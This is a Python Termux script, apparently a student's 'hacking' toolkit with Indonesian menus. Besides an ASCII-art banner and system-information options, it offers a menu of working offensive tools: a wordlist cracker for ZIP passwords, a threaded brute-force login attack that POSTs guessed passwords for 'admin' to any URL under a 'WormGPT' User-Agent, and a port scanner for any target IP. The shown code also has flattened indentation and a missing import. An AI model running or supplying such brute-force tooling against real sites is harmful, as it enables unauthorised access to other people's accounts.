#!/usr/bin/env python
# -*- coding: utf-8 -*-

from PIL import Image, ImageOps, ImageEnhance
from io import BytesIO
import os
import sys
import shutil
import urllib.request
import socket
import platform
import subprocess
import zipfile
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# =========================================
# REN.SIGMA - RENDY SUNANDAR (FIXED 2026)
# =========================================

IMAGE_URL = "https://raw.githubusercontent.com/rendysunandar856-maker/Rendysunandar/main/anime_baru.jpg"

RED = "\033[91m"
ORANGE = "\033[38;5;208m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"
CHARS = "@%#*+=-:. "

print_lock = threading.Lock()

# =========================================
# ASCII ART FUNCTION (FIXED INDENTATION)
# =========================================

def tampilkan_gambar():
 try:
 with urllib.request.urlopen(IMAGE_URL, timeout=10) as response:
 data = response.read()

 with Image.open(BytesIO(data)) as source:
 img = ImageOps.exif_transpose(source).convert("RGB")

 cols = shutil.get_terminal_size((80, 24)).columns
 width = min(max(cols - 2, 40), 85)
 height = max(1, int(img.height / img.width * width * 0.48))

 img = img.resize((width, height), Image.Resampling.LANCZOS)
 img = ImageEnhance.Contrast(img).enhance(1.4)
 img = ImageEnhance.Color(img).enhance(1.2)

 gray = ImageOps.autocontrast(ImageOps.grayscale(img), cutoff=1)
 rgb = list(img.getdata())
 levels = list(gray.getdata())

 for y in range(height):
 line = []
 for x in range(width):
 i = y * width + x
 r, g, b = rgb[i]
 value = levels[i]
 index = min(value * len(CHARS) // 256, len(CHARS) - 1)
 if value > 242:
 line.append(" ")
 else:
 line.append(f"\033[38;2;{r};{g};{b}m{CHARS[index]}\033[0m")
 print("".join(line))

 except Exception as e:
 print(YELLOW + "[!] Gambar tidak tersedia: " + str(e) + RESET)

# =========================================
# BANNER FUNCTIONS
# =========================================

def figlet(text, font="big"):
 try:
 result = subprocess.run(
 ["figlet", "-f", font, text],
 capture_output=True,
 text=True,
 timeout=3
 )
 if result.returncode == 0:
 return result.stdout.rstrip()
 except (FileNotFoundError, subprocess.SubprocessError):
 pass
 return text

def header():
 print()
 print(RED + figlet("Rendy Sunandar", "slant") + RESET)
 print(RED + " KELAS 11 TKJ" + RESET)
 print(RED + " ┌──────────────────────────────┐" + RESET)
 print(RED + " │ SYSTEM: TERMUX ANDROID │" + RESET)
 print(RED + " │ STATUS: READY │" + RESET)
 print(RED + " │ NETWORK: READY │" + RESET)
 print(RED + " │ SKILL: HACKING │" + RESET)
 print(RED + " └──────────────────────────────┘" + RESET)
 print()

def judul():
 print()
 print(ORANGE + figlet("RENDY", "big") + RESET)
 print(RED + figlet("SUNANDAR", "big") + RESET)
 print(ORANGE + "================================" + RESET)
 print(RED + " MENU UTAMA" + RESET)
 print(ORANGE + "================================" + RESET)

def jeda():
 input("\nTekan Enter untuk melanjutkan...")

# =========================================
# SYSTEM FUNCTIONS
# =========================================

def system_info():
 print("\n" + RED + "=== INFORMASI SISTEM ===" + RESET)
 print("Sistem:", platform.system())
 print("Versi:", platform.release())
 print("Arsitektur:", platform.machine())
 print("Platform:", platform.platform())
 print("Versi Python:", sys.version)
 print("Direktori:", os.getcwd())
 jeda()

def cek_internet():
 print("\n" + RED + "=== CEK KONEKSI INTERNET ===" + RESET)
 try:
 with socket.create_connection(("1.1.1.1", 443), timeout=5):
 print(GREEN + "[+] Koneksi berhasil." + RESET)
 except OSError as e:
 print(RED + "[-] Koneksi gagal: " + str(e) + RESET)
 jeda()

def info_jaringan():
 print("\n" + RED + "=== INFORMASI JARINGAN ===" + RESET)
 try:
 print("Hostname:", socket.gethostname())
 addresses = socket.getaddrinfo(socket.gethostname(), None)
 for address in sorted({item[4][0] for item in addresses}):
 print("Alamat IP:", address)
 except OSError as e:
 print("Gagal membaca jaringan:", e)
 jeda()

# =========================================
# CRACKING FUNCTIONS
# =========================================

def crack_zip_password(path, wordlist):
 print(RED + "=== CRACKING ZIP PASSWORD ===" + RESET)
 if not os.path.exists(path):
 print(RED + "[-] File ZIP tidak ditemukan." + RESET)
 return
 if not os.path.exists(wordlist):
 print(RED + "[-] Wordlist tidak ditemukan." + RESET)
 return

 start_time = time.time()
 try:
 with zipfile.ZipFile(path) as z:
 with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
 for line in f:
 word = line.strip()
 if not word:
 continue
 try:
 z.extractall(pwd=word.encode())
 print(GREEN + f"[+] Password ditemukan: {word}" + RESET)
 return
 except RuntimeError:
 continue
 except Exception as e:
 print(RED + f"[-] Error: {e}" + RESET)

 print(RED + "[-] Password tidak ditemukan." + RESET)
 print(f"Waktu: {time.time() - start_time:.2f} detik")

def brute_force_login(url, wordlist, max_workers=5):
 print(RED + "=== BRUTE FORCE LOGIN ===" + RESET)
 if not os.path.exists(wordlist):
 print(RED + "[-] Wordlist tidak ditemukan." + RESET)
 return

 headers = {"User-Agent": "WormGPT/5.2"}
 start_time = time.time()

 try:
 with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
 words = [line.strip() for line in f if line.strip()]

 with ThreadPoolExecutor(max_workers=max_workers) as executor:
 futures = []
 for word in words:
 future = executor.submit(check_password, url, word, headers)
 futures.append(future)

 for future in as_completed(futures):
 result = future.result()
 if result:
 print(GREEN + f"[+] Password ditemukan: {result}" + RESET)
 return

 except Exception as e:
 print(RED + f"[-] Error: {e}" + RESET)

 print(RED + "[-] Password tidak ditemukan." + RESET)
 print(f"Waktu: {time.time() - start_time:.2f} detik")

def check_password(url, password, headers):
 try:
 data = urllib.parse.urlencode({"username": "admin", "password": password}).encode()
 req = urllib.request.Request(url, data=data, headers=headers, method="POST")
 with urllib.request.urlopen(req, timeout=3) as response:
 if response.status == 200:
 return password
 except Exception:
 return None

# =========================================
# NETWORK TOOLS
# =========================================

def port_scanner(host):
 print(RED + "=== PORT SCANNER ===" + RESET)
 ports = [21, 22, 80, 443, 8080, 3306, 3389, 5000]
 start_time = time.time()

 for port in ports:
 try:
 with socket.create_connection((host, port), timeout=1.5):
 print(GREEN + f"[+] Port {port}/TCP OPEN" + RESET)
 except OSError:
 pass

 print(f"Scan selesai dalam {time.time() - start_time:.2f} detik")

# =========================================
# MENU FUNCTIONS
# =========================================

def cybersecurity_tools():
 while True:
 print("\n" + RED + "=== CYBERSECURITY TOOLS ===" + RESET)
 print("[1] Brute Force Login")
 print("[2] Crack ZIP Password")
 print("[3] Port Scanner")
 print("[0] Kembali")

 choice = input("\nPilih: ").strip()
 if choice == "1":
 url = input("URL Login: ").strip()
 wordlist = input("Wordlist: ").strip()
 brute_force_login(url, wordlist)
 elif choice == "2":
 path = input("File ZIP: ").strip()
 wordlist = input("Wordlist: ").strip()
 crack_zip_password(path, wordlist)
 elif choice == "3":
 host = input("Target IP: ").strip()
 port_scanner(host)
 elif choice == "0":
 return
 else:
 print("Pilihan tidak valid")
 jeda()

def menu():
 while True:
 judul()
 print("[1] Informasi Sistem")
 print("[2] Cek Internet")
 print("[3] Informasi Jaringan")
 print("[4] Cybersecurity Tools")
 print("[0] Keluar")

 choice = input("\nPilih: ").strip()
 if choice == "1":
 system_info()
 elif choice == "2":
 cek_internet()
 elif choice == "3":
 info_jaringan()
 elif choice == "4":
 cybersecurity_tools()
 elif choice == "0":
 print(GREEN + "Terima kasih!" + RESET)
 break
 else:
 print("Pilihan tidak valid")
 jeda()

# =========================================
# MAIN EXECUTION
# =========================================

if __name__ == "__main__":
 try:
 tampilkan_gambar()
 header()
 menu()
 except KeyboardInterrupt:
 print("\n" + YELLOW + "Program dihentikan." + RESET)
